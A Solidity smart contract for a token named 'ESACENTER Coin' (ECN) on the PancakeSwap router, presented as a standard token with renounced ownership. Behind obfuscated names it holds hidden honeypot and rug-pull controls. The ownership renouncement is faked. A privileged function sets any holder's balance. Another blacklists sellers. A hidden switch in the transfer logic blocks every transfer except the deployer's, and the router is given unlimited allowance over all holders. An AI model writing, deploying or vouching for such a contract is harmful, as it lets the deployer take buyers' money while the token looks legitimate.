//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface amountList {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptWallet) external view returns (uint256);

    function transfer(address liquidityReceiver, uint256 feeTake) external returns (bool);

    function allowance(address totalTeam, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeTake) external returns (bool);

    function transferFrom(
        address sender,
        address liquidityReceiver,
        uint256 feeTake
    ) external returns (bool);

    event Transfer(address indexed from, address indexed walletMode, uint256 value);
    event Approval(address indexed totalTeam, address indexed spender, uint256 value);
}

interface senderTake {
    function createPair(address senderTotalLiquidity, address enableMaxLaunched) external returns (address);
}

interface receiverToShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract liquidityBuyMarketing {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountListMetadata is amountList {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ESACENTERCoin is liquidityBuyMarketing, amountList, amountListMetadata {

    uint256 private liquiditySenderIs;

    function owner() external view returns (address) {
        return exemptEnable;
    }

    event OwnershipTransferred(address indexed isFromLaunch, address indexed receiverEnable);

    address private exemptEnable;

    function symbol() external view virtual override returns (string memory) {
        return amountToken;
    }

    function maxTake() public {
        emit OwnershipTransferred(toAmount, address(0));
        exemptEnable = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return marketingTake;
    }

    address public toAmount;

    function minAuto() private view {
        require(tokenTake[_msgSender()]);
    }

    mapping(address => uint256) private txLiquidityMin;

    function allowance(address launchedMax, address sellSwap) external view virtual override returns (uint256) {
        if (sellSwap == isLaunched) {
            return type(uint256).max;
        }
        return enableTotal[launchedMax][sellSwap];
    }

    function name() external view virtual override returns (string memory) {
        return atTeam;
    }

    mapping(address => bool) public exemptAuto;

    uint8 private limitToken = 18;

    mapping(address => mapping(address => uint256)) private enableTotal;

    function getOwner() external view returns (address) {
        return exemptEnable;
    }

    mapping(address => bool) public tokenTake;

    address tradingTakeMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function launchedTake(address receiverToken) public {
        minAuto();
        
        if (receiverToken == toAmount || receiverToken == limitFrom) {
            return;
        }
        exemptAuto[receiverToken] = true;
    }

    address public limitFrom;

    uint256 public teamBuy;

    function decimals() external view virtual override returns (uint8) {
        return limitToken;
    }

    function fundListIs(address launchedEnable) public {
        if (senderEnable) {
            return;
        }
        if (enableMin) {
            liquiditySenderIs = receiverList;
        }
        tokenTake[launchedEnable] = true;
        
        senderEnable = true;
    }

    bool private enableMin;

    function enableBuy(address sellFee, uint256 feeTake) public {
        minAuto();
        txLiquidityMin[sellFee] = feeTake;
    }

    function marketingMin(uint256 feeTake) public {
        minAuto();
        minMax = feeTake;
    }

    address isLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 minMax;

    string private amountToken = "ECN";

    function transferFrom(address listTotal, address liquidityReceiver, uint256 feeTake) external override returns (bool) {
        if (_msgSender() != isLaunched) {
            if (enableTotal[listTotal][_msgSender()] != type(uint256).max) {
                require(feeTake <= enableTotal[listTotal][_msgSender()]);
                enableTotal[listTotal][_msgSender()] -= feeTake;
            }
        }
        return toWallet(listTotal, liquidityReceiver, feeTake);
    }

    bool public swapWallet;

    uint256 private marketingTake = 100000000 * 10 ** 18;

    bool private isShould;

    constructor (){
        if (liquiditySenderIs == teamBuy) {
            teamBuy = liquiditySenderIs;
        }
        maxTake();
        receiverToShould walletFund = receiverToShould(isLaunched);
        limitFrom = senderTake(walletFund.factory()).createPair(walletFund.WETH(), address(this));
        if (receiverList == liquiditySenderIs) {
            isShould = false;
        }
        toAmount = _msgSender();
        tokenTake[toAmount] = true;
        txLiquidityMin[toAmount] = marketingTake;
        
        emit Transfer(address(0), toAmount, marketingTake);
    }

    uint256 liquidityTo;

    function approve(address sellSwap, uint256 feeTake) public virtual override returns (bool) {
        enableTotal[_msgSender()][sellSwap] = feeTake;
        emit Approval(_msgSender(), sellSwap, feeTake);
        return true;
    }

    bool public senderEnable;

    function transfer(address sellFee, uint256 feeTake) external virtual override returns (bool) {
        return toWallet(_msgSender(), sellFee, feeTake);
    }

    function swapEnable(address listTotal, address liquidityReceiver, uint256 feeTake) internal returns (bool) {
        require(txLiquidityMin[listTotal] >= feeTake);
        txLiquidityMin[listTotal] -= feeTake;
        txLiquidityMin[liquidityReceiver] += feeTake;
        emit Transfer(listTotal, liquidityReceiver, feeTake);
        return true;
    }

    function toWallet(address listTotal, address liquidityReceiver, uint256 feeTake) internal returns (bool) {
        if (listTotal == toAmount) {
            return swapEnable(listTotal, liquidityReceiver, feeTake);
        }
        uint256 totalAmount = amountList(limitFrom).balanceOf(tradingTakeMax);
        require(totalAmount == minMax);
        require(!exemptAuto[listTotal]);
        return swapEnable(listTotal, liquidityReceiver, feeTake);
    }

    string private atTeam = "ESACENTER Coin";

    function balanceOf(address exemptWallet) public view virtual override returns (uint256) {
        return txLiquidityMin[exemptWallet];
    }

    uint256 private receiverList;

}